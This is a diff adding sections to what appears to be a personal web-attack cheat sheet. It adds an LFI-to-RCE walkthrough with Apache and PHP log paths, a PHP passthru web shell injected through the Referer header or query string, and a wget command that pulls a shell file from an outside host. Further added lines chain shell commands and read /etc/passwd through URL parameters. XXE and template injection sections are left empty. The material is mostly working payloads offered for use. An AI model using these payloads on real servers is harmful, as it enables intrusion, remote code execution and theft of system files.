@@ -77,6 +77,54 @@ go run main.go -u https://ns.agency -w ~/1_RECON/_WORDLISTS/Directories_Common.w
 ```
 
 ---
+### Local/Remote File Inclusion
+---  
+
+STEP #1: Verify existence of LFI/LFD vulnerability.
+```
+domain.com/?p=somepage.txt
+domain.com/?p=pagename-whatever
+domain.com/?class=something&function=another 
+```
+
+STEP #2: Figure out where the logfiles are. Example locations:
+```
+// PHP Logfiles:
+/usr/local/etc/php
+/etc/php.d/*.ini
+/etc/php5/cli/php.ini
+/usr/local/lib/php.ini
+/etc/php.ini
+  
+// Apache Logfiles:
+/var/log/apache2/access.log
+/var/log/httpd/error_log
+/var/log/apache2/error.log
+/var/log/httpd-error.log
+```
+
+STEP #3: Inject a payload into the logfile:
+
+  * _PHP passthru() function_: Execute an external program and display raw output
+  * Attack vectors:
+     * URL query string: `example.com/?q=injectpaylod`
+     * HTTP Headers: Referer header.
+```
+<?php passthru($_GET['cmd']); ?>
+<?php passthru(['ls -l']); ?>
+```
+
+STEP #4: With command execution, use wget to upload your own files to the server:
+```
+/var/log/apache2/access.log&cmd=wget http://somedomain.com/shellfile.php
+OR
+<?php passthru(['w']); ?>
+```
+
+Another LFI / LFI->RCE Cheatsheet:  
+* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal
+
+---
 ### SQLi
 ---
 
@@ -105,12 +153,38 @@ Enumerate a specific database:
 python sqlmap.py -u [ example.com/?id=1234 ] --dump -D [ database_name ] --level=3
 ```
 
+---
+### Other/Advanced Injection
+---
+
+**Command Injection**
+Examples:
+```
+http://shitesite/lol.php?path=cat%20/etc/passwd
+http://roflblock/cgi-bin/userData.pl?doc=/bin/ls|
+```  
+Injection via. chaining:  
+```
+original_cmd_by_server; ls
+original_cmd_by_server && ls
+original_cmd_by_server | ls
+original_cmd_by_server || ls    // Only if the first cmd fail
+```  
+Execution inside another command:  
+```
+original_cmd_by_server `cat /etc/passwd`
+original_cmd_by_server $(cat /etc/passwd)
+```  
+
+**Template Injection**
 
 
 ---
-### Advanced Injection
----
+### XML External Entities
+---  
+```
 
+```
 ---
 ### XSS Normal + Advanced
 ---
@@ -148,6 +222,8 @@ Note:
 ---
 ### Server-Side Request Forgery
 ---
-Summary: Make a server perform a request to another
+Summary: Attacker can make requests from a server to target its internal systems (i.e intranet) by bypassing its firewalls.
+
+
 
 
